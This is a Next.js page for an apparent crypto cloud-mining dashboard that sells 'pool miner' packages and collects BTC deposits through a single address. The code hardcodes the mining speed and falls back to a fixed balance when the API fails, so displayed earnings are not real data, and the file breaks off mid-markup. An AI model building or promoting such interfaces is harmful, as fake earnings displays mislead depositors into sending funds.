"use client"

import Image from 'next/image'
import React, { useState, useEffect } from 'react'
import QRCode from "qrcode";
import axios from 'axios';
import * as Yup from "yup";
import { useAuth } from '@/app/context/AuthContext';
import { IoClose, IoGiftOutline } from "react-icons/io5";
import { LuArrowDownToLine, LuArrowUpToLine, LuBell, LuClock, LuClock10, LuClock12, LuClock4, LuClock5, LuKeyRound, LuPlus, LuRotate3D, LuRotateCcw, LuSun, LuUsers, LuWallet } from "react-icons/lu";
import { DesktopSideBar } from '@/app/dashboard/components/DesktopSideBar';
import LoadingScreen from './loading';
import { Footer } from '@/app/dashboard/components/Footer';
import { GiDigDug } from 'react-icons/gi';
import { FaAngleRight, FaInfo } from 'react-icons/fa6';
import { CgArrowLeft } from 'react-icons/cg';
import { Carousel } from 'flowbite-react';
import { Formik, Form, Field, ErrorMessage } from 'formik';
import { BiCopy } from 'react-icons/bi';
import { GrTransaction } from 'react-icons/gr';
import { useRouter } from 'next/navigation';
import { IoIosArrowRoundForward } from 'react-icons/io';
import { Header } from '../components/Header';

const blocks = [
    {
        block_speed: process.env.NEXT_PUBLIC_BLOCK_A_SPEED,
        block_bonus_hash: process.env.NEXT_PUBLIC_BLOCK_A_BONUS_HASHRATE,
        block_amount_btc: process.env.NEXT_PUBLIC_BLOCK_A_AMOUNT_BTC,
        block_amount_usdt: process.env.NEXT_PUBLIC_BLOCK_A_AMOUNT_USDT,
        block_duration: process.env.NEXT_PUBLIC_BLOCK_A_DURATION,
        block_description: process.env.NEXT_PUBLIC_BLOCK_A_DESCRIPTION,
        block_discount: process.env.NEXT_PUBLIC_BLOCK_A_DISCOUNT,

    },
    {
        block_speed: process.env.NEXT_PUBLIC_BLOCK_B_SPEED,
        block_bonus_hash: process.env.NEXT_PUBLIC_BLOCK_B_BONUS_HASHRATE,
        block_amount_btc: process.env.NEXT_PUBLIC_BLOCK_B_AMOUNT_BTC,
        block_amount_usdt: process.env.NEXT_PUBLIC_BLOCK_B_AMOUNT_USDT,
        block_duration: process.env.NEXT_PUBLIC_BLOCK_B_DURATION,
        block_description: process.env.NEXT_PUBLIC_BLOCK_B_DESCRIPTION,
        block_discount: process.env.NEXT_PUBLIC_BLOCK_B_DISCOUNT,

    },
    {
        block_speed: process.env.NEXT_PUBLIC_BLOCK_C_SPEED,
        block_bonus_hash: process.env.NEXT_PUBLIC_BLOCK_C_BONUS_HASHRATE,
        block_amount_btc: process.env.NEXT_PUBLIC_BLOCK_C_AMOUNT_BTC,
        block_amount_usdt: process.env.NEXT_PUBLIC_BLOCK_C_AMOUNT_USDT,
        block_duration: process.env.NEXT_PUBLIC_BLOCK_C_DURATION,
        block_description: process.env.NEXT_PUBLIC_BLOCK_C_DESCRIPTION,
        block_discount: process.env.NEXT_PUBLIC_BLOCK_C_DISCOUNT,

    },
    {
        block_speed: process.env.NEXT_PUBLIC_BLOCK_D_SPEED,
        block_bonus_hash: process.env.NEXT_PUBLIC_BLOCK_D_BONUS_HASHRATE,
        block_amount_btc: process.env.NEXT_PUBLIC_BLOCK_D_AMOUNT_BTC,
        block_amount_usdt: process.env.NEXT_PUBLIC_BLOCK_D_AMOUNT_USDT,
        block_duration: process.env.NEXT_PUBLIC_BLOCK_D_DURATION,
        block_description: process.env.NEXT_PUBLIC_BLOCK_D_DESCRIPTION,
        block_discount: process.env.NEXT_PUBLIC_BLOCK_D_DISCOUNT,

    },
    {
        block_speed: process.env.NEXT_PUBLIC_BLOCK_E_SPEED,
        block_bonus_hash: process.env.NEXT_PUBLIC_BLOCK_E_BONUS_HASHRATE,
        block_amount_btc: process.env.NEXT_PUBLIC_BLOCK_E_AMOUNT_BTC,
        block_amount_usdt: process.env.NEXT_PUBLIC_BLOCK_E_AMOUNT_USDT,
        block_duration: process.env.NEXT_PUBLIC_BLOCK_E_DURATION,
        block_description: process.env.NEXT_PUBLIC_BLOCK_E_DESCRIPTION,
        block_discount: process.env.NEXT_PUBLIC_BLOCK_E_DISCOUNT,

    },
    {
        block_speed: process.env.NEXT_PUBLIC_BLOCK_F_SPEED,
        block_bonus_hash: process.env.NEXT_PUBLIC_BLOCK_F_BONUS_HASHRATE,
        block_amount_btc: process.env.NEXT_PUBLIC_BLOCK_F_AMOUNT_BTC,
        block_amount_usdt: process.env.NEXT_PUBLIC_BLOCK_F_AMOUNT_USDT,
        block_duration: process.env.NEXT_PUBLIC_BLOCK_F_DURATION,
        block_description: process.env.NEXT_PUBLIC_BLOCK_F_DESCRIPTION,
        block_discount: process.env.NEXT_PUBLIC_BLOCK_F_DISCOUNT,

    }
]

export default function Page() {
  const router = useRouter();
    const [step, setStep] = useState(2);
    const [screen, setScreen] = useState(1);
      const { user } = useAuth();
      const [loading, setLoading] = useState(false);
      const [blockLength, setBlockLength] = useState(0);
      const [loading2, setLoading2] = useState(false);
      const [selectedBlock, setSelectedBlock] = useState(blocks[0]);
      const [coin, setCoin] = useState("BTC");
      const [airdrop, setAirdrop] = useState({});
        const [airdropId, setAirdropId] = useState("");
        const [blockFetched, setBlockFetched] = useState(false);
        const [allBlocks, setAllBlocks] = useState(null);
        const [allBlocksAmount, setAllBlocksAmount] = useState("");
      const [amount, setAmount] = useState(selectedBlock.block_amount_btc);
        const [isError, setIsError] = useState(false);
          const [errorMessage, setErrorMessage] = useState("");
          const walletAddress = process.env.NEXT_PUBLIC_BITCOIN_BTC;

          const [qr, setQr] = useState("");
            
              useEffect(() => {
                QRCode.toDataURL(walletAddress)
                  .then(url => setQr(url))
                  .catch(err => console.error(err));
              }, []);

              useEffect(() => {
                      async function fetchBlockLength() {
                        try {
                          setLoading(true);
                
                          const res = await axios.get(
                            `/api/auth/users/mining/btc?userId=${user._id}`,
                            {
                              withCredentials: true,
                              headers: { "Content-Type": "application/json" },
                            }
                          );
                
                          if (res.status === 200) {
                            setBlockLength(res.data.block);
                            setAllBlocks(res.data.blocks);
                            setAllBlocksAmount(res.data.blocksAmount);
                            setLoading(false);
                          }
                        } catch(err) {
                          setBlockLength(0);
                          setAllBlocksAmount("0.00105546");
                          setLoading(false);
                        }
                      }
                  
                      fetchBlockLength();
                    }, []);

              useEffect(() => {
                      async function fetchTransactions() {
                        try {
                          setLoading(true);
                
                          const res = await axios.get(
                            `/api/auth/users/mine/token?userId=${user._id}`,
                            {
                              withCredentials: true,
                              headers: { "Content-Type": "application/json" },
                            }
                          );
                
                          if (res.status === 200 && res.data.blockInitiated === false) {
                            setBlockFetched(false);
                            setStep(1);
                            setLoading(false);
                          }
              
                          if (res.status === 200 && res.data.blockInitiated === true) {
                            
                            setBlockFetched(true);
                            setAirdrop(res.data.airdrop);
                            setAirdropId(res.data.airdrop._id);
                            setStep(2);
                            setLoading(false);
                          }
                        } catch(err) {
                          setBlockFetched(false);
                          setStep(1);
                          setLoading(false);
                        }
                      }
                  
                      fetchTransactions();
                    }, []);
              
            
              // ✅ Copy Address
              const copyAddress = () => {
                  // Get the text field
              let copyText = document.getElementById("address");
          
              // Select the text field
              copyText.select();
              copyText.setSelectionRange(0, 99999); // For mobile devices
          
              // Copy the text inside the text field
              navigator.clipboard.writeText(walletAddress);
                alert("Wallet address copied ✅");
              };
            
              // ✅ Download QR
              const downloadQR = () => {
                const link = document.createElement("a");
                link.href = qr;
                link.download = "wallet-qr.png";
                link.click();
              };
      
        let initialValueTransactionID = {
          transactionID: "",
        }
      
        const validationSchemaTransactionID = Yup.object({
          transactionID: Yup.string()
            .required("Please enter you transaction ID."),
        });

        async function initializeAirdrop() {
            try {
              const res = await axios.post(
                    `/api/auth/users/mine`,
                    {
                      userId: user._id,
                      amount: "0.00105546",       // send as string (best practice)
                      miningRate: "100.0",     // percentage
                      launchDate: "2027-04-19T10:00:00Z",
                    },
                    {
                      withCredentials: true,
                      headers: {
                        'Content-Type': 'application/json',
                      },
                    }
              );

              
        
              if (res.status === 200) {
                window.location.reload();
              }
        
            } catch (err) {
              setStep(1);
            }
          }

        async function processPayment (values, onSubmitProps) {
                setIsError(false)
                setLoading2(true);
        
                try {
        
              const res = await axios.post(
                `/api/auth/users/mining/btc?userId=${user._id}`,
                {
                  transactionID: values.transactionID,
                  currency: coin,
                  amount: selectedBlock.block_amount_btc,  
                },
                {
                  withCredentials: true,
                  headers: { "Content-Type": "application/json" }  
                }
              );
        
              if (res.status === 200) {
                setIsError(false);
                setScreen(4);
              }
              
            } catch(err) {
              setErrorMessage(err.response.data.error);
              setIsError(true);
              setLoading2(false);
            }
          }

    return (
        <div className="bg-white w-full h-full dark:bg-isoDark dark:text-white text-black space-y-5 relative font-[family-name:var(--font-geist-sans)]">
            {loading === true && (<LoadingScreen tab={"airdrop"} />)}
            {loading2 === true && (<LoadingScreen tab={"signIn"} />)}
    
            

            <div className='w-full h-full md:pt-20 flex items-start'>
         
              <DesktopSideBar tab={"airdrop"} />
    
              <div className='w-full space-y-7'>

              {
                screen !== 1 && (
                  <div className='flex items-center p-4 justify-center relative'>
                    {
                        screen === 2 ? (
                            <a href='#'
                                className='flex absolute left-4 dark:text-isoColor2'
                                onClick={() => setScreen(1)}
                            >
                                <CgArrowLeft className='text-2xl' />
                            </a>
                        ) : screen === 3 ? (
                            <a href='#'
                                className='flex absolute left-4 dark:text-isoColor2'
                                onClick={() => setScreen(2)}
                            >
                                <CgArrowLeft className='text-2xl' />
                            </a>
                        ) : (
                            <a href='#'
                                className='flex absolute left-4 dark:text-isoColor2'
                                onClick={() => setScreen(1)}
                            >
                                <CgArrowLeft className='text-2xl' />
                            </a>
                        )
                    }

                    <h1 className='text-lg font-bold md:text-3xl md:font-semibold'>

                    {screen === 2 ? (
                        <span>Add Block Miner</span>
                    ) : screen === 5 ? (
                        <span>My Pool Miners</span>
                    ) : screen === 3 ? (
                        <span>Buy / {selectedBlock.block_amount_btc} {coin}</span>
                    ) : (
                        <span></span>
                    )}
                
                    </h1>
                </div>
                )
              }

                {
                  screen === 1 && (
                    <div className='w-full space-y-4 h-full dark:bg-isoDark dark:text-white text-black relative flex flex-col md:justify-center md:items-center md:px-40'>
                      <div className='w-full bg-[#f4f4f1] dark:bg-isoDark2 justify-center items-center rounded-b-full flex flex-col space-y-8'>
      
                        <div className='flex w-full justify-between items-center px-5'>
                          <a href='/dashboard/wallets' className='w-fit dark:bg-isoDark dark:text-isoColor2 flex text-base text-[#f4f4f1] space-x-1 items-center flex-nowrap px-3 py-2 rounded-full bg-[#000]'>
                            <LuWallet className='w-5 h-5' />
                            <span className='text-sm'>ConnectWallet</span>
                          </a>
      
                          <div className='w-fit flex text-base space-x-1 items-center flex-nowrap px-3 py-2 rounded-full'>
                            <Image
                                    src="/icons/bitcoin.webp"
                                    alt="bitcoin_logo"
                                    className="w-6"
                                    width={10}
                                    height={0}
                                  />
                            {blockFetched === true ? (<span className='text-xs'><span className='text-base'>{allBlocksAmount}</span></span>) : (<span className='text-xs'><span className='text-base'>0.00000000</span></span>)}
                          </div>
                        </div>
      
                          <div className='flex bg-white overflow-hidden dark:bg-isoDark justify-center items-center w-52 h-52 rounded-full'>
                            {step === 2 &&
                              (<div className='flex flex-col items-center space-y-0'>
                                <div className='w-fit flex text-base space-x-2 items-center flex-nowrap rounded-full'>
                                  <Image
                                    src="/icons/bitcoin.webp"
                                    alt="bitcoin_logo"
                                    className="w-8"
                                    width={20}
                                    height={0}
                                  />
                                  {blockFetched === true ? (<span className='text-xs font-semibold'><span className='text-xl'>{allBlocksAmount}</span></span>) : (<span className='text-xs font-semibold'><span className='text-xl'>0.00000000</span></span>)}
                                </div>
      
                                <div className='w-fit flex text-base space-x-1 items-center flex-nowrap px-3 py-2 rounded-full'>
                                  <p className='text-isoColor1 dark:text-isoColor2'>55.0 MH/s</p>
                                  <span className='text-sm font-semibold'>/ day</span>
                                </div>
      
                                <div className='w-fit flex text-basespace-x-2 items-center flex-nowrap rounded-full'>
                                  <LuUsers className='w-5 h-5' />
                                  <span className='text-sm'>1 / {user.total_referral}</span>
                                </div>
                              </div>)
                            }
      
                            {
                              step === 1 && (
                                <div onClick={initializeAirdrop} className='flex justify-center items-center flex-col space-y-3'>
                                  <GiDigDug className='w-20 h-20' />
                                  <p>Start Mining</p>
                                </div>
                              )
                            }
      
                            {
                              step === 3 && (
                                <div className='flex justify-center items-center font-semibold text-2xl flex-col space-y-3'>
                                  <p>Tap</p>
                                </div>
                              )
                            }
                          </div>
      
                      </div>

                      <div className="container mx-auto rounded-3xl px-5 h-36 w-full md:px-52">
                                                                                                                                  <Carousel
                                                                                                                                    slideInterval={2000}
                                                                                                                                    pauseOnHover
                                                                                                                                    indicators
                                                                                                                                    className='[&_button]:hidden rounded-3xl'
                                                                                                                                  >
                                                                                                                                    <a href='#' onClick={() => setScreen(2)} className='w-full rounded-3xl bg-[#f4f4f5] dark:bg-isoDark2 dark:text-white text-black border border-yellow-400 p-4 flex space-x-3 items-start'>
                                                                                                                                      <div className='bg-yellow-500 rounded-full p-2 text-black'><GiDigDug className={`h-4 w-4`} /></div>
                                                                                                                                      <p className='text-sm flex flex-col'>
                                                                                                                                          <span>Add a pool mining power - be part of the finishing supply limit of Bitcoin era. Mine BTC NOW!</span>
                                                                                                                                          <span className='flex items-center space-x-1'>
                                                                                                                                              <span className='text-isoColor1 dark:text-isoColor2 font-medium'>Explore now</span>
                                                                                                                                              <IoIosArrowRoundForward className='w-3 h-3' />
                                                                                                                                          </span>
                                                                                                                                      </p>
                                                                                                                                    </a>
                                                                                                                                    <a href='/dashboard/wallets' className='w-full rounded-3xl bg-[#f4f4f5] dark:bg-isoDark2 dark:text-white text-black border border-[#f4f4] p-4 flex space-x-3 items-start'>
                                                                                                                                      <div className='bg-[#f4f4] rounded-full p-2 text-black'><LuWallet className={`h-4 w-4`} /></div>
                                                                                                                                      <p className='text-sm flex flex-col'>
                                                                                                                                          <span>All mined BTC are automatically transferred to your connected wallet after each block duration.</span>
                                                                                                                                          <span className='flex items-center space-x-1'>
                                                                                                                                              <span className='text-isoColor1 dark:text-isoColor2 font-medium'>Explore now</span>
                                                                                                                                              <IoIosArrowRoundForward className='w-3 h-3' />
                                                                                                                                          </span>
                                                                                                                                      </p>
                                                                                                                                    </a>
                                                                                                                                    <a href='/dashboard/rewards' className='w-full rounded-3xl bg-[#f4f4f5] dark:bg-isoDark2 dark:text-white text-black border border-green-400 p-4 flex space-x-3 items-start'>
                                                                                                                                      <div className='bg-green-500 rounded-full p-2 text-black'><IoGiftOutline className={`h-4 w-4`} /></div>
                                                                                                                                      <p className='text-sm flex flex-col'>
                                                                                                                                          <span>Claim your reward - Invite your friends to mine BTC and earn +100 MH/s mining speed.</span>
                                                                                                                                          <span className='flex items-center space-x-1'>
                                                                                                                                              <span className='text-isoColor1 dark:text-isoColor2 font-medium'>Explore now</span>
                                                                                                                                              <IoIosArrowRoundForward className='w-3 h-3' />
                                                                                                                                          </span>
                                                                                                                                      </p>
                                                                                                                                    </a>
                                                                                                                                  </Carousel>
                      </div>

                      <div className='px-4'>
                        <div
                        className="bg-white dark:bg-isoDark2 dark:border-neutral-600 rounded-3xl p-4 space-y-6 border border-neutral-100 shadow-sm hover:shadow-2xl hover:-translate-y-1 transition-all duration-500"
                      >
                        <a href='#' onClick={() => setScreen(5)} className='w-full py-2 border-b dark:border-neutral-600 border-neutral-200 flex justify-between items-center'>
                              <div className='flex text-xl font-bold items-center space-x-2'>
                                <GiDigDug className='text-isoColor1 dark:text-isoColor2 w-5 h-5' />
                                <h1>Pool Miners</h1>
                              </div>
                              <div className='flex text-xl font-bold items-center space-x-4'>
                                <span>{blockLength}</span>
                                <FaAngleRight className='text-neutral-400 dark:text-isoColor2 w-5 h-5' />
                              </div>
                        </a>
                        <p className='text-sm text-neutral-400'>Boost your mining power - each Pool Miner adds extra speed and maximizes your earnings.</p>
                        <a href='#' onClick={() => setScreen(2)} className='w-full dark:bg-isoColor2 dark:text-black flex justify-center items-center bg-isoColor1 text-lg text-white rounded-lg p-3'>+ Add Pool Miner</a>
                        </div>
                      </div>
      
                      <div className='py-6 px-4 flex justify-between items-center w-full'>
                          <div className='flex flex-col justify-start space-y-0 w-full'>
                              <div className='flex flex-wrap space-y-2 justify-between w-full items-center'>
                                  <h1 className='text-base font-medium'>Invite your friends to mine BTC and earn +100 MH/s mining speed</h1>
                                  <a href='/dashboard/rewards' className='w-fit flex dark:bg-isoDark2 dark:text-white text-base text-black space-x-1 items-center flex-nowrap px-3 py-2 rounded-full bg-[#f4f4f1]'>
                                      <IoGiftOutline className='w-5 h-5 dark:text-isoColor2' />
                                      <span className='text-sm'>Claim Rewards</span>
                                  </a>
                              </div>
                          </div>
                      </div>

                      <div className='w-full h-28'></div>
                    </div>
                  )
                }

                {
                  screen === 2 && (
                    <div className='w-full h-full min-h-screen px-4 space-y-5 flex relative flex-col'>

                          <div className='space-y-3'>
                            <h1 className='font-bold text-lg'>Duration</h1>
                            <p className='text-sm text-neutral-500'>Choose how long your miner will run. Longer duration brings bigger profits.</p>
                          </div>
                      
                          <div className="grid grid-cols-1 md:grid-cols-2 gap-y-4 md:gap-8">
                              
                            {blocks.map((block) => (
                              <div key={block.block_duration} onClick={() => setSelectedBlock(block)} className={`bg-[#f4f4f7] p-1 dark:bg-isoDark2 dark:text-white rounded-lg w-full hover:bg-isoColor1 dark:hover:bg-isoColor2 dark:hover:text-black duration-300 hover:text-white ${
                                selectedBlock === block
                                        ? 'bg-isoColor1 dark:bg-isoColor2 dark:text-black text-white'
                                        : ''
                              }`}>
                                <div className='flex justify-between p-2 text-lg items-center'>
                                <h1 className='font-bold'>{block.block_duration.toUpperCase()}</h1>
                                <p className='font-medium'>{block.block_amount_btc} {coin}</p>
                                </div>

                                <div className='bg-white dark:bg-isoDark dark:text-white text-black rounded-lg p-5 space-y-4'>
                                  <div className='flex items-center space-x-2 font-semibold'>
                                    <div className='text-white rounded-full p-1 dark:bg-isoColor2 dark:text-black bg-isoColor1'><IoGiftOutline className={`h-3 w-3`} /></div>
                                    <p>Bonus Hashrate</p>
                                    <p>{block.block_bonus_hash}</p>
                                  </div>

                                  <p className='text-xs text-neutral-500'>{block.block_description}</p>

                                  <div className='flex items-center space-x-1'>
                                    <div className='text-white rounded-md py-1 px-3 w-fit bg-green-500'>{block.block_discount}</div>
                                    {block.block_duration === "36 months" && (<div className='text-white rounded-md py-1 px-3 w-fit bg-purple-600'>BEST</div>)}
                                  </div>
                                </div>
                              </div>
                            ))}

                          </div>

                          <div className='pb-32'>
                            <div
                            className="bg-white dark:bg-isoDark2 dark:border-neutral-600 rounded-3xl p-4 space-y-2 border border-neutral-100 shadow-2xl"
                          >
                            <h1 className='font-bold text-lg'>Order details</h1>
                            <div className="border-b dark:border-neutral-600 text-base border-neutral-200 py-2 w-full">
                              <div className='w-full py-2 flex justify-between items-center'>
                                <p className='flex font-semibold items-center space-x-2'>
                                      Speed
                                    </p>
                                    <p className='flex text-purple-500 font-semibold items-center space-x-4'>
                                      {selectedBlock.block_speed}
                                    </p>
                              </div>
                              <div className='w-full py-2 flex justify-between items-center'>
                                <p className='flex font-semibold items-center space-x-2'>
                                      Duration
                                    </p>
                                    <p className='flex text-green-500 font-semibold items-center space-x-4'>
                                      {selectedBlock.block_duration}
                                    </p>
                              </div>
                            </div>
                            <div className="text-sm py-2 w-full">
                              <div className='w-full py-2 flex justify-between items-center'>
                                <p className='flex font-semibold text-neutral-400 items-center space-x-2'>
                                      Your discount
                                    </p>
                                    <p className='flex text-green-500 font-semibold items-center space-x-4'>
                                      {selectedBlock.block_discount}
                                    </p>
                              </div>
                              <div className='w-full py-2 flex justify-between items-center'>
                                <p className='flex font-semibold text-neutral-400 items-center space-x-2'>
                                      Total Price
                                    </p>
                                    <p className='flex text-base flex-col font-semibold items-center space-x-4'>
                                      <span>{selectedBlock.block_amount_btc} {coin}</span>
                                      <span className='text-neutral-500'>{selectedBlock.block_amount_usdt}</span>
                                    </p>
                              </div>
                            </div>
                            <a href='#' onClick={() => setScreen(3)} className='w-full flex dark:bg-isoColor2 dark:text-black justify-center items-center bg-isoColor1 text-lg text-white rounded-lg p-3'>Buy / {selectedBlock.block_amount_btc} {coin}</a>
                            </div>
                          </div>
                      </div>
                  )
                }

                {
                  screen === 3 && (
                    <div className="flex flex-col dark:space-y-5 items-center px-4 w-full pb-40 md:px-40 justify-center">
                    
                                            <div className='w-full rounded-3xl dark:bg-isoDark2 dark:text-white dark:border dark:border-neutral-600 bg-[#f4f4f5] text-black p-3 flex space-x-3 items-center'>
                                                <div className='bg-isoColor1 dark:bg-isoColor2 dark:text-black rounded-full p-1 text-blue-100'><FaInfo className={`h-4 w-4`} /></div>
                                                <p className='text-xs'>Before sending, double-check <span className="text-isoColor1 dark:text-isoColor2">the network</span>, <span className="text-isoColor1 dark:text-isoColor2">deposit address</span>, and <span className="text-isoColor1 dark:text-isoColor2">coin</span>, and send only <span className="text-isoColor1 dark:text-isoColor2">the exact amount</span>.</p>
                                            </div>
                    
                                            <div className='w-full flex flex-col md:px-5 relative md:w-[450px] md:h-[650px] md:rounded-3xl md:shadow-lg'>
                                                
                                                <div className="">
                                                    <div className="flex justify-center items-center">
                    
                                                        {/* QR Code */}
                                                        <div className="flex justify-center items-center">
                                                        {qr && (
                                                            <div className="p-3 bg-white relative rounded-2xl">
                                                            <img
                                                                src={qr}
                                                                onClick={downloadQR}
                                                                alt="Wallet QR"
                                                                className="w-44 h-44"
                                                            />
                    
                                                            <div className='absolute bg-white p-1 top-20 right-20 '>
                                                                    {coin === "BTC" ? (
                                                                    <Image
                                                                        src="/icons/bitcoin.webp"
                                                                        alt="Astiox_logo"
                                                                        className="w-7"
                                                                        width={50}
                                                                        height={0}
                                                                    />)
                                                                    : coin === "ETH" ? (
                                                                        <Image
                                                                        src="/icons/ethereum.webp"
                                                                        alt="Astiox_logo"
                                                                        className="w-7"
                                                                        width={50}
                                                                        height={0}
                                                                    />
                                                                    )
                                                                    : coin === "USDT" ? (
                                                                        <Image
                                                                        src="/icons/Tether.webp"
                                                                        alt="Astiox_logo"
                                                                        className="w-7"
                                                                        width={50}
                                                                        height={0}
                                                                        />
                                                                    )
                                                                    : coin === "BNB" ? (
                                                                        <Image
                                                                        src="/icons/bnb-icon2_2x.webp"
                                                                        alt="Astiox_logo"
                                                                        className="w-7"
                                                                        width={50}
                                                                        height={0}
                                                                        />
                                                                    )
                                                                    : coin === "XRP" ? (
                                                                        <Image
                                                                        src="/icons/xrp-symbol-white-128.webp"
                                                                        alt="Astiox_logo"
                                                                        className="w-7"
                                                                        width={50}
                                                                        height={0}
                                                                        />
                                                                        )
                                                                    : coin === "SOL" ? (
                                                                        <Image
                                                                        src="/icons/solana.webp"
                                                                        alt="Astiox_logo"
                                                                        className="w-7"
                                                                        width={50}
                                                                        height={0}
                                                                        />
                                                                        )
                                                                    : (
                                                                        <Image
                                                                        src="/icons/Tether.webp"
                                                                        alt="Astiox_logo"
                                                                        className="w-7"
                                                                        width={50}
                                                                        height={0}
                                                                        />
                                                                        )}
                                                            </div>
                    
                                                            </div>
                                                        )}
                                                        </div>
                    
                                                    </div>
                                                </div>
                    
                                                <div className="flex w-full justify-between relative items-center">
                                                    <div className="space-y-0 flex flex-col flex-wrap py-4 border-b dark:border-neutral-600 border-gray-100">
                                                        <p className="text-sm text-neutral-500">Network</p>
                    
                                                        <h1 className='text-lg font-semibold'>
                                                                        {coin === "BTC" ? "BTC"
                                                                        : coin === "ETH" ? "ETH"
                                                                        : coin === "USDT" ? "BSC"
                                                                        : coin === "BNB" ? "BSC"
                                                                        : coin === "XRP" ? "XRP"
                                                                        : coin === "SOL" ? "SOL"
                                                                        : "TRX"}
                                                        </h1>
                                                        <span className="text-xs text-neutral-400">
                                                                        {coin === "BTC" ? "Bitcoin (BTC)"
                                                                          : coin === "ETH" ? "Ethereum (ETH)"
                                                                          : coin === "USDT" ? "Tether USD (BEP20)"
                                                                          : coin === "BNB" ? "BNB Smart Chain (BNB)"
                                                                          : coin === "XRP" ? "BNB pegged XRP Token (BEP20)"
                                                                          : coin === "SOL" ? "Solana (SOL)"
                                                                          : ""}
                                                        </span>
                                                    </div>
                                                </div>
                    
                                                <div className="flex w-full justify-between relative items-center">
                                                    <div className="space-y-0 flex flex-col flex-wrap py-4 border-b dark:border-neutral-600 border-gray-100">
                                                        <p className="text-sm text-neutral-500">Amount</p>
                                                        <h1 className="text-lg font-semibold">{selectedBlock.block_amount_btc} {coin}</h1>
                                                    </div>
                    
                                                    <div className="flex absolute right-0 pl-6">
                                                        <span onClick={() => setScreen(2)} className="rounded-xl dark:bg-isoDark2 dark:text-white bg-[#f4f4f5] text-black p-3 ">
                                                            <GrTransaction className='w-5 h-5' />
                                                        </span>
                                                    </div>
                                                </div>
                    
                                                <div className="flex w-full justify-between relative items-center">
                                                    <div className="space-y-0 flex flex-col flex-wrap py-6 border-b dark:border-neutral-600 border-gray-100">
                                                        <p className="text-sm text-neutral-500">Deposit Address</p>
                                                        <input
                                                        id="address"
                                                        className="text-lg py-1 dark:bg-isoDark2 dark:text-white font-normal text-black w-full flex flex-wrap hover:outline-none px-0 border-0 outline-none"
                                                        type="text"
                                                        value={walletAddress}
                                                        readOnly
                                                        />
                                                    </div>
                    
                                                    <div className="flex absolute right-0 pl-6">
                                                        <span onClick={copyAddress} className="rounded-xl dark:bg-isoDark2 dark:text-white bg-[#f4f4f5] text-black p-3 ">
                                                            <BiCopy className='w-5 h-5' />
                                                        </span>
                                                    </div>
                                                </div>
                    
                                                <div className="flex flex-col space-y-4 py-4 text-xs">
                                                    <p className="flex justify-between items-center">
                                                        <span className="text-neutral-400">Minimum deposit</span>
                                                        <span className="">{'> '}{selectedBlock.block_amount_btc} {coin}</span>
                                                    </p>
                    
                                                    <p className="flex justify-between items-center">
                                                        <span className="text-neutral-400">Credited (Trading enabled)</span>
                                                        <span className="">1 Confirmation(s)</span>
                                                    </p>
                    
                                                    <p className="flex justify-between items-center">
                                                        <span className="text-neutral-400">Unlocked (Withdrawal enabled)</span>
                                                        <span className="">1 Confirmation(s)</span>
                                                    </p>
                                                </div>
                    
                                                <div className='fixed md:absolute bottom-0 bg-white dark:bg-isoDark dark:text-white py-4 left-4 right-4'>
                                                    <Formik
                                                                initialValues={initialValueTransactionID}
                                                                validationSchema={validationSchemaTransactionID}
                                                                onSubmit={processPayment}
                                                            >
                                                                {({ errors, touched, values }) => (
                                                                <Form className="w-full flex md:px-8 flex-col space-y-4">
                                                                    <div>
                                                                    <label
                                                                        htmlFor="transactionID"
                                                                        className="flex space-x-2 items-center text-sm pb-1"
                                                                    >Transaction ID:</label>
                                                                    <Field name="transactionID">
                                                                        {(props) => {
                                                                        const { field, form, meta } = props;
                                                                        return (
                                                                            <input
                                                                            placeholder=""
                                                                            className={`form__input dark:md:bg-isoDark dark:focus:border-isoColor2 dark:bg-isoDark2 dark:border-neutral-600 dark:text-neutral-500 border-neutral-200 border text-neutral-400 font-medium rounded-full w-full p-3 text-md focus:outline-none focus:border-isoColor1 focus:text-black`}
                                                                            type="text"
                                                                            id="transactionID"
                                                                            name="transactionID"
                                                                            {...field}
                                                                            />
                                                                        );
                                                                        }}
                                                                    </Field>
                                                                    <ErrorMessage name="transactionID">
                                                                        {(errMsg) => (
                                                                        <span className="text-red-500 text-xs">{errMsg}</span>
                                                                        )}
                                                                    </ErrorMessage>
                                                                    </div>
                                                                    {isError === true && (<p className='text-red-500 text-xs'>{errorMessage}</p>)}
                    
                                                                    <button
                                                                    type="submit"
                                                                    className="w-full py-4 dark:bg-isoColor2 dark:text-black rounded-full bg-isoColor1 text-md hover:bg-isoColor2 hover:text-black text-white"
                                                                    disabled={Formik.isValid || Formik.isSubmitting}
                                                                    >
                                                                    {loading ? "Processing..." : "Save and Process Payment"}
                                                                    </button>
                                                                </Form>
                                                                )}
                                                    </Formik>
                                                </div>
                    
                                            </div>
                    
                                        </div>
                  )
                }

                {
                  screen === 4 && (
                    <div className="w-full h-full p-10 flex fixed top-0 bottom-0 right-0 left-0 justify-center bg-black/70 items-center loading-modal">
                                                                    <div className="rounded-2xl md:w-96 duration-500 transition-all h-fit w-full  flex flex-col items-center py-5 px-3 bg-white dark:bg-isoDark2 dark:text-white space-y-4">
                                                                      <div className='flex justify-center items-center w-full'><LuArrowDownToLine className='w-16 dark:text-isoColor2 text-isoColor1 h-16' /></div>
                                                        
                                                                      <h1 className='px-6 text-lg font-medium text-center md:font-semibold'>Deposit Request was Successful!</h1>
                                                        
                                                                      <p className='text-xs text-center'>
                                                                        The Deposit request you made has been successful sent. {process.env.NEXT_PUBLIC_COMPANY_NAME} is processing your transaction and you'll be notified went the verification is completed. Thank you.
                                                                      </p>
                                                    
                                                                      <a
                                                                        href="/dashboard/mining"
                                                                        className="w-full py-3 text-center dark:bg-isoColor2 dark:text-black rounded-xl bg-isoColor1 text-md hover:bg-isoColor2 hover:text-black text-white"
                                                                      >
                                                                              OK
                                                                      </a>
                                                                    </div>
                                                        </div>
                  )
                }

                {
                  screen === 5 && (
                    <div className='w-full h-full min-h-screen px-4 space-y-5 flex relative flex-col'>

                          <div className='space-y-3'>
                            <h1 className='font-bold text-lg'>Pools</h1>
                            <p className='text-sm text-neutral-500'>Your pool miners will appear here. All amounts are summed and calculated totally.</p>
                          </div>
                      
                          <div className="grid grid-cols-1 md:grid-cols-2 gap-y-4 md:gap-8">
                              
                            {allBlocks !== null && allBlocks.map((block, index) => (
                              <div key={index} className={`bg-[#f4f4f7] p-1 dark:bg-isoDark2 dark:text-white rounded-lg w-full hover:bg-isoColor1 dark:hover:bg-isoColor2 dark:hover:text-black duration-300 hover:text-white`}>
                                <div className='flex justify-between p-2 text-lg items-center'>
                                <h1 className='font-bold'>{block.status.toUpperCase()}</h1>
                                <p className='font-medium'>{block.amount.$numberDecimal} {coin}</p>
                                </div>

